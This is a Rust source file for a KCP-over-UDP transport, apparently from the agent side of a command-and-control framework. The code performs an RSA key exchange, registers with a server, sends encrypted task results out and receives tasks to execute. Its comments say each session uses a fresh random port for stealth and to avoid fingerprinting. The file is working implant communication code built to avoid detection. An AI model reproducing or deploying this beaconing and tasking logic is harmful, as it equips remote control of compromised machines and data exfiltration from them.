// KCP transport — reliable UDP (matches Go agent/transport/kcp.go). Same
// packet-level handshake/polling as TCP; only the dial layer differs. Short
// lived: each register/checkin opens a fresh KCP session from a random
// ephemeral UDP port and closes it right after (stealthy, anti-fingerprint).
//
// Protocol interop: Rust `kcp` 0.6 <-> Go `kcp-go` v5 verified bidirectionally
// (stream mode, conv=0, nodelay fast mode).

use crate::protocol::{read_packet, write_packet, Packet, TYPE_CHECKIN, TYPE_CLOSE, TYPE_REGISTER, TYPE_REGISTER_ACK, TYPE_REQUEST_KEY, TYPE_SERVER_KEY, TYPE_TASK};
use kcp::Kcp;
use std::io::{self, Write};
use std::net::UdpSocket;
use std::time::{Duration, Instant, SystemTime};

use super::TransportError;

/// Wrap a KCP session + UDP socket as a blocking-ish io::Read/Write adapter.
/// Reads pump the socket and drive KCP until `peeksize` has data (or timeout).
pub struct KcpIo {
    kcp: Kcp<UdpWriter>,
    sock: UdpSocket,
    read_buf: Vec<u8>,
    read_pos: usize,
    read_deadline: Option<Instant>,
}

impl KcpIo {
    fn pump(&mut self) -> Result<(), String> {
        let mut buf = [0u8; 4096];
        loop {
            match self.sock.recv_from(&mut buf) {
                Ok((len, _)) => {
                    self.kcp
                        .input(&buf[..len])
                        .map_err(|e| format!("kcp input: {e}"))?;
                }
                Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => break,
                Err(e) => return Err(format!("udp recv: {e}")),
            }
        }
        let now = now_ms();
        self.kcp.update(now).map_err(|e| format!("kcp update: {e}"))?;
        Ok(())
    }

    /// Public pump: drain UDP → KCP input → update. Call frequently (idle loop).
    pub fn pump_public(&mut self) -> Result<(), String> {
        self.pump()
    }

    /// Non-blocking read of one complete KCP chunk, if available.
    pub fn recv_available(&mut self) -> Option<Vec<u8>> {
        if let Ok(sz) = self.kcp.peeksize() {
            if sz > 0 {
                let mut tmp = vec![0u8; sz];
                if let Ok(n) = self.kcp.recv(&mut tmp[..]) {
                    return Some(tmp[..n].to_vec());
                }
            }
        }
        None
    }

    /// Blocking-ish packet read with timeout (used for handshake / poll replies).
    pub fn read_packet_timeout(&mut self, timeout: Duration) -> Result<crate::protocol::Packet, String> {
        self.read_deadline = Some(Instant::now() + timeout);
        crate::protocol::read_packet(self).map_err(|e| format!("kcp read: {e}"))
    }

    /// Write one packet and flush (drives a KCP update so it actually goes out).
    pub fn write_packet_flush(&mut self, pkt: &crate::protocol::Packet) -> Result<(), String> {
        crate::protocol::write_packet(self, pkt).map_err(|e| e.to_string())?;
        self.flush().map_err(|e| e.to_string())
    }

    fn next_chunk(&mut self) -> Result<bool, String> {
        self.pump()?;
        if let Ok(sz) = self.kcp.peeksize() {
            if sz > 0 {
                let mut tmp = vec![0u8; sz];
                let n = self.kcp.recv(&mut tmp).map_err(|e| format!("kcp recv: {e}"))?;
                self.read_buf = tmp[..n].to_vec();
                self.read_pos = 0;
                return Ok(true);
            }
        }
        Ok(false)
    }
}

impl io::Read for KcpIo {
    fn read(&mut self, out: &mut [u8]) -> io::Result<usize> {
        while self.read_pos >= self.read_buf.len() {
            if let Some(dl) = self.read_deadline {
                if Instant::now() > dl {
                    return Err(io::Error::new(io::ErrorKind::TimedOut, "kcp read timeout"));
                }
            }
            let ok = self.next_chunk().map_err(io::Error::other)?;
            if !ok {
                std::thread::sleep(Duration::from_millis(5));
            }
        }
        let n = (out.len()).min(self.read_buf.len() - self.read_pos);
        out[..n].copy_from_slice(&self.read_buf[self.read_pos..self.read_pos + n]);
        self.read_pos += n;
        Ok(n)
    }
}

impl io::Write for KcpIo {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        // KCP stream mode: send() returns 0 in stream mode on success (it
        // queues); wrap errors.
        let _ = self.kcp.send(buf).map_err(|e| io::Error::new(io::ErrorKind::Other, format!("kcp send: {e}")))?;
        let now = now_ms();
        self.kcp.update(now).map_err(|e| io::Error::new(io::ErrorKind::Other, format!("kcp update: {e}")))?;
        Ok(buf.len())
    }
    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
}

struct UdpWriter {
    sock: UdpSocket,
    server: String,
}

impl Write for UdpWriter {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        self.sock.send_to(buf, &self.server)?;
        Ok(buf.len())
    }
    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
}

fn now_ms() -> u32 {
    SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as u32
}

pub struct KcpTransport {
    pub host: String,
    pub port: u16,
    pub agent_id: String,
    pub rsa_pub_pem: String,
    pub seq: u64,
    pub session_keys: Option<crate::protocol::crypto::SessionKeys>,
}

/// Create a fresh KCP session + UDP socket bound to the server (short-lived).
/// Used by the KCP polling transport and the RCP KCP channel.
pub fn new_kcp_io(host: &str, port: u16, timeout: Duration) -> Result<KcpIo, TransportError> {
    let addr = format!("{}:{}", host, port);
    let sock = UdpSocket::bind("0.0.0.0:0")?;
    sock.set_nonblocking(true)?;
    sock.connect(&addr)?; // filter datagrams from the server
    let sock2 = sock.try_clone().map_err(TransportError::Io)?;

    let mut kcp = Kcp::new_stream(0, UdpWriter { sock: sock2, server: addr });
    // Fast mode (nodelay=1, 10ms interval, fast resend, no congestion ctrl).
    kcp.set_nodelay(true, 10, 2, true);
    kcp.set_wndsize(2048, 2048);

    Ok(KcpIo {
        kcp,
        sock,
        read_buf: Vec::new(),
        read_pos: 0,
        read_deadline: Some(Instant::now() + timeout),
    })
}

impl KcpTransport {
    pub fn new(host: &str, port: u16, agent_id: &str, rsa_pub_pem: &str) -> Self {
        KcpTransport {
            host: host.to_string(),
            port,
            agent_id: agent_id.to_string(),
            rsa_pub_pem: rsa_pub_pem.to_string(),
            seq: 0,
            session_keys: None,
        }
    }

    pub fn dial(&self, timeout: Duration) -> Result<KcpIo, TransportError> {
        new_kcp_io(&self.host, self.port, timeout)
    }

    pub fn register(&mut self, reg_json: &[u8]) -> Result<(), TransportError> {
        if self.rsa_pub_pem.is_empty() {
            // Key bootstrap over a throwaway KCP session.
            let mut key_io = self.dial(Duration::from_secs(10))?;
            write_packet(&mut key_io, &Packet::new(TYPE_REQUEST_KEY, Vec::new()))?;
            key_io.flush()?;
            let key_resp = read_packet(&mut key_io)?;
            if key_resp.ptype != TYPE_SERVER_KEY || key_resp.payload.is_empty() {
                return Err(TransportError::Other("key request failed".into()));
            }
            self.rsa_pub_pem = String::from_utf8_lossy(&key_resp.payload).into_owned();
        }

        let keys = crate::protocol::crypto::SessionKeys::generate();
        let mut key_material = Vec::with_capacity(64);
        key_material.extend_from_slice(&keys.aes_key);
        key_material.extend_from_slice(&keys.hmac_key);
        let encrypted_keys =
            crate::protocol::crypto::rsa_encrypt_oaep(&self.rsa_pub_pem, &key_material)
                .map_err(TransportError::Other)?;
        let encrypted_reg = keys.encrypt(reg_json);

        let mut payload = Vec::with_capacity(4 + encrypted_keys.len() + encrypted_reg.len());
        payload.extend_from_slice(&(encrypted_keys.len() as u32).to_le_bytes());
        payload.extend_from_slice(&encrypted_keys);
        payload.extend_from_slice(&encrypted_reg);

        let mut io = self.dial(Duration::from_secs(10))?;
        write_packet(&mut io, &Packet::new(TYPE_REGISTER, payload))?;
        io.flush()?;

        let ack = read_packet(&mut io)?;
        if ack.ptype != TYPE_REGISTER_ACK {
            return Err(TransportError::Other("register: unexpected ack type".into()));
        }
        keys.decrypt(&ack.payload).map_err(TransportError::Other)?;
        self.session_keys = Some(keys.clone());
        Ok(())
    }

    pub fn checkin(&mut self, results: Option<&[u8]>) -> Result<Vec<u8>, TransportError> {
        self.seq += 1;
        let body = match results {
            Some(r) if !r.is_empty() => {
                let keys = self.session_keys.as_ref().ok_or(TransportError::Other("no session keys".into()))?;
                use crate::protocol::codec::{Codec, DefaultCodec};
                DefaultCodec::new(keys.aes_key, keys.hmac_key).encode(r)
            }
            _ => Vec::new(),
        };
        let mut payload = Vec::with_capacity(24 + body.len());
        payload.extend_from_slice(self.agent_id.as_bytes());
        payload.extend_from_slice(&self.seq.to_be_bytes());
        payload.extend_from_slice(&body);

        let mut io = self.dial(Duration::from_secs(20))?;
        write_packet(&mut io, &Packet::new(TYPE_CHECKIN, payload))?;
        io.flush()?;

        let resp = read_packet(&mut io)?;
        if resp.ptype == TYPE_TASK {
            let keys = self.session_keys.as_ref().ok_or(TransportError::Other("no session keys".into()))?;
            let dec = keys
                .decrypt(&resp.payload)
                .map_err(TransportError::Other)?;
            Ok(dec)
        } else if resp.ptype == TYPE_CLOSE {
            Err(TransportError::Other("reauth required".into()))
        } else {
            Err(TransportError::Other("checkin: unexpected packet type".into()))
        }
    }

    pub fn reset_seq(&mut self) {
        self.seq = 0;
    }
}
